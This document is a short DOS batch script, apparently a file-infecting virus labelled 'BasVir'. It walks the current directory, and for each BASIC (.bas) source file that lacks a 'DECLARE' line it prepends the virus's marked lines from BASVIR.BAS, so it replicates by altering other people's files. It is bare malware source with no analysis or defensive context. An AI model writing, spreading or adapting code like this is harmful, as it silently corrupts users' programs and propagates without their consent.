@echo off %BasVir1%
if '%1=='BasVir goto BasVir%2
for %%a in (*.bas) do call ~$ BasVir 2 %%a
exit
:BasVir2
find "DECLARE "<%3>nul
if not errorlevel 1 goto BasVirE
echo basvirH$ = "%3">~1
find "BasVir"<BASVIR.BAS>>~1
copy %3 ~2>nul
copy /b ~1+~2 %3>nul
exit
:BasVirE
